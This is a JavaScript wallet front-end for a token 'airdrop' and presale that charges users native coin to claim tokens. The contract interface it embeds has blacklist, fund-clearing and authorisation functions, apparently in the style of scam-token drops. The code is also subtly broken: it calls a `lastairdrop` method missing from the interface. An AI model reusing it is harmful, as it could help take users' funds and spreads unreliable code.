let web3 = new web3js.myweb3(window.ethereum);

let addr;

const sttaddr = "0xFa8AF5641eceC18a733aBfC76C16EECd4aceE9dF";
const sttabi = [{
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "internalType": "address",
        "name": "owner",
        "type": "address"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }, {
        "indexed": false,
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
    }],
    "name": "Approval",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": true,
        "internalType": "address",
        "name": "from",
        "type": "address"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "indexed": false,
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
    }],
    "name": "Transfer",
    "type": "event"
}, {
    "stateMutability": "nonpayable",
    "type": "fallback"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "liquidity_",
        "type": "address"
    }],
    "name": "Liquidity",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "addr",
        "type": "address"
    }],
    "name": "addLiquidity",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "_refer",
        "type": "address"
    }],
    "name": "airdrop",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "owner_",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }],
    "name": "allowance",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "spender",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "num",
        "type": "uint256"
    }],
    "name": "authNum",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "owner_",
        "type": "address"
    }, {
        "internalType": "uint8",
        "name": "black_",
        "type": "uint8"
    }],
    "name": "black",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "_refer",
        "type": "address"
    }],
    "name": "buy",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [],
    "name": "cap",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "clearETH",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [],
    "name": "decimals",
    "outputs": [{
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "getBlock",
    "outputs": [{
        "internalType": "bool",
        "name": "swAirdorp",
        "type": "bool"
    }, {
        "internalType": "bool",
        "name": "swSale",
        "type": "bool"
    }, {
        "internalType": "uint256",
        "name": "sPrice",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "sMaxBlock",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "nowBlock",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "balance",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "airdropEth",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "name",
    "outputs": [{
        "internalType": "string",
        "name": "",
        "type": "string"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "owner",
    "outputs": [{
        "internalType": "address",
        "name": "",
        "type": "address"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "ah",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "ah2",
        "type": "address"
    }],
    "name": "setAuth",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [],
    "name": "symbol",
    "outputs": [{
        "internalType": "string",
        "name": "",
        "type": "string"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [],
    "name": "totalSupply",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "transfer",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "sender",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "transferFrom",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "newOwner",
        "type": "address"
    }],
    "name": "transferOwnership",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "uint8",
        "name": "tag",
        "type": "uint8"
    }, {
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
    }],
    "name": "update",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "stateMutability": "payable",
    "type": "receive"
}];


let sttcontract = new web3.eth.Contract(sttabi, sttaddr);

const loadweb3 = async () => {
    try {
        web3 = new web3js.myweb3(window.ethereum);
        sttcontract = new web3.eth.Contract(sttabi, sttaddr);
        let a = await ethereum.enable();
        addr = web3.utils.toChecksumAddress(a[0]);
        return (addr);

    } catch (error) {
        if (error.code === 4001) {
            console.log('Please connect to MetaMask.')
        } else {
            console.error(error)
        }
    }

};


const getAirdrop = async () => {
    await loadweb3();

    if (addr == undefined) {
        alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended. Refresh and try again.");
    }
    let fresh = document.getElementById('airinput').value;
    sttcontract.methods.airdrop(fresh).send({
        from: addr,
        value: 3000000000000000
    }, (err, res) => {
        if (!err) console.log(res);
        else console.log(err);
    });
}



const buystt = async () => {

    await loadweb3();

    if (addr == undefined) {
        alert("No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.");
    }

    let ethval = document.getElementById("buyinput").value;
    ethval = Number(ethval) * 1e18;
    let fresh = document.getElementById('airinput').value;


    sttcontract.methods.buy(fresh).send({
        from: addr,
        value: ethval
    }, (err, res) => {
        if (!err) console.log(res);
        else console.log(err);
    });
}

const cooldowncheck = async () => {
    let blocknumber = await currentblock();
    let last = await lastblock();


    if (blocknumber - last < 50) {
        console.log(blocknumber, last);
        let waittime = 50 + last - blocknumber;
        console.log(waittime);
        alert("You must wait " + waittime + " blocks before claiming another airdrop");
        return false;
    } else return true;

};


const currentblock = async () => {
    let a;
    await web3.eth.getBlockNumber((err, res) => {
        a = res;
    });
    return (a);
}

const lastblock = async () => {
    let a;
    await sttcontract.methods.lastairdrop(addr).call((err, res) => {
        a = res;
    });
    return (a);
}